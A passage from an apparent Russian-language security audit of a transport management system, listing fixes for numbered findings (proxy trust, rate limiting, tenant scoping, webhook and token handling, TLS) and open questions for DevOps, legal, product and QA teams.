4. `trustProxy` ограничить адресом или подсетью nginx (или `X-Forwarded-For $remote_addr` в nginx), добавить лимит и lockout по email для login/verify/forgot (SEC-02, SEC-14).
5. Единый `orgScopeOrDeny()` вместо примерно 140 мест `if (organizationId)`, NULL-org сущности открывать только super-admin, назначить org seed-пользователям (SEC-06).
6. `assertTripAccess` в `GET /transport-documents/:id`. HMAC или одноразовый токен в Госключ externalId (SEC-07, SEC-08).
7. Re-query рефанда в вебхуке ЮKassa (SEC-09). Закрыть `edi/mock-progress` в prod (SEC-10).
8. Почта в prod: запретить `devCode` и console-адаптер (SEC-11). TLS по умолчанию и исправление пути к TLS-конфигу (SEC-12). Fail-fast на слабый `JWT_SECRET` (SEC-13).
9. Ближайший спринт: refresh-токены и отзыв при logout, парольная политика ≥12, ограниченный MinIO-пользователь, nonce-CSP (SEC-15…SEC-21).

## Открытые вопросы к другим ролям

- **DevOps:** публичный ли репозиторий `goga74russ/tms` и был ли он публичным когда-либо? Какой `NGINX_CONF` и какой email-провайдер (SMTP или Unisender) реально стоят в проде? Запускался ли на проде `seed.ts` (org-less пользователи)? Есть ли облачный metadata-сервис, доступный из контейнера (для оценки SEC-05)?
- **Юрист:** нужно ли уведомлять Роскомнадзор об инциденте по 152-ФЗ (ст. 21 ч. 3.1, 24/72 ч), если SEC-01 подтвердится как эксплуатированный? Форма `/public/contact` собирает телефон и имя без чекбокса согласия на обработку ПДн.
- **Backend/Product:** нужен ли платформенный super-admin как «admin без org» вообще, или лучше вынести его в отдельную роль `platform_admin` с явным флагом (это закрывает целый класс fail-open)?
- **QA:** добавить регрессионные тесты на: XFF-ротацию против rate limit, `/telegram/setup-webhook` от tenant-admin (ожидается 403), `GET /transport-documents/:id` от client другого контрагента (ожидается 403), поддельный `refund.succeeded`.
